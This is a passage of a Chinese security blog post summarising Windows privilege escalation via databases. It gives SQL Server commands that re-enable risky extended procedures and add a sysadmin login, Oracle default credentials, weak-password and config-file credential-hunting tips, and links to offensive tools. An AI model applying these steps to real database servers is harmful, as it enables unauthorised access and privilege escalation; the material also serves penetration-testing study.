+EXEC sp_addextendedproc Sp_OAGetErrorInfo ,@dllname ='odsole70.dll'
+EXEC sp_addextendedproc Sp_OAGetProperty ,@dllname ='odsole70.dll'
+EXEC sp_addextendedproc Sp_OAMethod ,@dllname ='odsole70.dll'
+EXEC sp_addextendedproc Sp_OASetProperty ,@dllname ='odsole70.dll'
+EXEC sp_addextendedproc Sp_OAStop ,@dllname ='odsole70.dll'
+EXEC sp_addextendedproc xp_regaddmultistring ,@dllname ='xpstar.dll'
+EXEC sp_addextendedproc xp_regdeletekey ,@dllname ='xpstar.dll'
+EXEC sp_addextendedproc xp_regdeletevalue ,@dllname ='xpstar.dll'
+EXEC sp_addextendedproc xp_regenumvalues ,@dllname ='xpstar.dll'
+EXEC sp_addextendedproc xp_regremovemultistring ,@dllname ='xpstar.dll'
+EXEC sp_addextendedproc xp_regwrite ,@dllname ='xpstar.dll'
+EXEC sp_addextendedproc xp_dirtree ,@dllname ='xpstar.dll'
+EXEC sp_addextendedproc xp_regread ,@dllname ='xpstar.dll'
+EXEC sp_addextendedproc xp_fixeddrives ,@dllname ='xpstar.dll'
+</pre>
+<p>加sa账号</p>
+<pre>
+exec master.dbo.sp_addlogin username,password
+exec master.dbo.sp_addsrvrolemember username,sysadmin
+</pre>
+
+<p><a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a><br>sqltools2</p>
+<h2 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a><strong>oracle</strong></h2><p>有关于oracle数据库利用国内比较少基本都是千篇一律<br>一些默认账号和密码<br>Oracle 11g 默认用户名密码<br>安装Oracle时，若没有为下列用户重设密码，则其默认密码如下：</p>
+<p><a href="https://blog.csdn.net/weinichendian/article/details/78774253" target="_blank" rel="noopener">https://blog.csdn.net/weinichendian/article/details/78774253</a></p>
+<p>下面介绍其中有几个账户的作用：  </p>
+<ol>
+<li>SYS/CHANGE_ON_INSTALL or INTERNAL<br>系统用户，数据字典所有者，超级权限所有者(SYSDBA)<br>建议创建后立即修改密码，此用户不能被删除。  </li>
+</ol>
+<p>SYSTEM/MANAGER<br>数据库默认管理用户，拥有DBA角色权限<br>建议创建后立即修改密码，此用户不能被删除。  </p>
+<ol start="2">
+<li><p>OUTLN/OUTLN<br>优化计划的存储大纲用户<br>建议创建后立即修改密码，此用户不能被删除。</p>
+</li>
+<li><p>SCOTT/TIGER, ADAMS/WOOD, JONES/STEEL, CLARK/CLOTH and BLAKE/PAPER.<br>实验、测试用户，含有例表EMP与DEPT<br>可以修改密码，用户可以被删除，在产品环境建议删除或锁定。</p>
+</li>
+<li><p>HR/HR (Human Resources), OE/OE (Order Entry), SH/SH (Sales History).<br>实验、测试用户，含有例表EMPLOYEES与DEPARTMENTS<br>可以修改密码，用户可以被删除，在产品环境建议删除或锁定。</p>
+</li>
+<li><p>DBSNMP/DBSNMP<br>智能代理<br>可以改变密码，需要放置新密码到snmp_rw.ora文件，如果不需要Intelligent Agents，可以删除。</p>
+</li>
+</ol>
+<p>这时候要找到一组用户名、密码提示被锁，才能进行下一步安装ORACLE时，若没有为下列用户重设密码，则其默认密码如下：</p>
+<p>用户名/密码 登录身份 说明</p>
+<p>sys/change_on_install SYSDBA或SYSOPER 不能以NORMAL登录，可作为默认的系统管理员</p>
+<p>system/manager SYSDBA或NORMAL 不能以SYSOPER登录，可作为默认的系统管理员</p>
+<p>sysman/oem_temp sysman 为oms的用户名</p>
+<p>scott/tiger NORMAL 普通用户</p>
+<p>aqadm /aqadm SYSDBA或NORMAL 高级队列管理员</p>
+<p>Dbsnmp/dbsnmp SYSDBA或NORMAL 复制管理员</p>
+<p>也可以试一下oracle  system  sys  admin等等弱口令<br>或者在网站的数据库配置文件中寻找数据库连接信息<br>如果连接信息被编译成class可以用jad进行反编译查看连接配置  </p>
+<p><a href="https://github.com/5z1punch/oracle_java_shell_client" target="_blank" rel="noopener">https://github.com/5z1punch/oracle_java_shell_client</a><br><a href="https://github.com/quentinhardy/odat" target="_blank" rel="noopener">https://github.com/quentinhardy/odat</a><br><a href="https://github.com/kimtg/OracleShell" target="_blank" rel="noopener">https://github.com/kimtg/OracleShell</a></p>
+<p>未完待续</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/提权/" rel="tag"># 提权</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/26/windows下载执行文件总结/" rel="next" title="windows下载执行文件总结">
+                <i class="fa fa-chevron-left"></i> windows下载执行文件总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/08/Advanced-Local-Procedure-Call-利用/" rel="prev" title="Advanced Local Procedure Call 利用">
+                Advanced Local Procedure Call 利用 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="WBGlIl">
+            
+              <p class="site-author-name" itemprop="name">WBGlIl</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                大佬们的博客
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sariel.top/" title="只因不值得" target="_blank">只因不值得</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://422926799.github.io/" title="九世" target="_blank">九世</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ggsec.cn/" title="Demon" target="_blank">Demon</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.secist.com/" title="即刻安全" target="_blank">即刻安全</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://nek0y4nsu.github.io/" title="Yansu" target="_blank">Yansu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blue-bird1.github.io/" title="青鸟" target="_blank">青鸟</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://qwq.moe/" title="蚊子の博客" target="_blank">蚊子の博客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://9bie.org/" title="biebie" target="_blank">biebie</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows提权总结"><span class="nav-number">1.</span> <span class="nav-text">Windows提权总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-本地提权"><span class="nav-number">1.1.</span> <span class="nav-text">1. 本地提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-常见服务提权"><span class="nav-number">1.2.</span> <span class="nav-text">2. 常见服务提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql"><span class="nav-number">1.3.</span> <span class="nav-text">mysql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql密码破解"><span class="nav-number">1.4.</span> <span class="nav-text">mysql密码破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mssql-SQLServer"><span class="nav-number">1.5.</span> <span class="nav-text">mssql(SQLServer)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#oracle"><span class="nav-number">1.6.</span> <span class="nav-text">oracle</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">WBGlIl</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+
+
